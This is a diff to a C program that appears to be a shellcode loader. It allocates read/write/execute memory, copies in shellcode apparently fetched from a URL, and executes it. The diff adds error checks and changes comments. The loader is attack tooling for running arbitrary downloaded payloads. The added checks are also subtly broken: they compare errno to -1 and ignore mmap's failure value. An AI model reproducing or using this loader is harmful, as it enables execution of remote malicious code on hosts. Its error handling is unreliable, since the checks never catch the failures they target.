@@ -2,8 +2,7 @@
 #include <stdlib.h>  // malloc and free
 #include <string.h>  // memcpy, memset
 #include <sys/mman.h>  // mmap, mumap
-#include <unistd.h>  // fork
-#include <sys/wait.h>  // wait
+#include <errno.h>  // erno
 
 /**
  * Execute the shellcode
@@ -16,14 +15,16 @@ int execute_shellcode(void* shellcode, size_t size) {
 	void* executable_memory = 
 		mmap(0, size, PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,
 			-1, 0);
+	if (errno == -1) return -1;
 
 	// ensure read/write/execute permissions on memory
 	mprotect(executable_memory, size, PROT_READ|PROT_WRITE|PROT_EXEC);
+	if (errno == -1) return -1;
 
 	// copy shellcode to executable memory
 	memcpy(executable_memory, shellcode, size);
 
-	// test to show shellcode function:
+	// test to show shellcode function
 	for (size_t i = 0; i < size; i++) {
 		printf("%dth byte: 0x%x\n", i, ((unsigned char*)executable_memory)[i]);
 	}
@@ -36,12 +37,15 @@ int execute_shellcode(void* shellcode, size_t size) {
 
 	// deallocate executable memory
 	munmap(executable_memory, size);
+	if (errno == -1) return -1;
+
 	return 0;
 }
 
 /**
  * Get shellcode from a source
- * @param shellcode pointer which will point to the shellcode
+ * @param shellcode pointer which will point to the heap allocated shellcode.
+ * 		Must be free'd once done.
  * @param url the URL of the shellcode
  * @return the size of the shellcode
  */
@@ -79,8 +83,9 @@ int main(int argc, const char** argv) {
 	// }
 
 	int status = execute_shellcode(shellcode, shellcode_size);
-	
-	// free 
+	printf("Shellcode exit status: %d", status);
+
+	// free allocated shellcode
 	free(shellcode);
 	return 0;
 }
